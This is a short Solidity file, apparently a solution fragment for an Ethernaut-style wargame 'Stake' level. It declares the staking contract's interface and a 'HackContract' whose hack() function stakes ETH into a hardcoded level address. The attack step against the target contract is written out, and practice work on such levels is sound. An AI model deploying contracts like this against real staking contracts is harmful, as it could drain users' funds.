pragma solidity ^0.8.19;
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Stake {
    function WETH() external returns(address);
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns(bool);
    function Unstake(uint256 amount) external returns(bool);
    function UserStake(address user) external returns(uint256);
    function Stakers(address user) external returns(bool);
    function totalStaked() external returns(uint256);
}

contract HackContract {
    function hack() external payable {
        address levelContractAddress = 0x935F24648bD3158E318e5C0830986a431dA11FB1;
        Stake s = Stake(levelContractAddress);

        s.StakeETH{value : msg.value}();
    }
}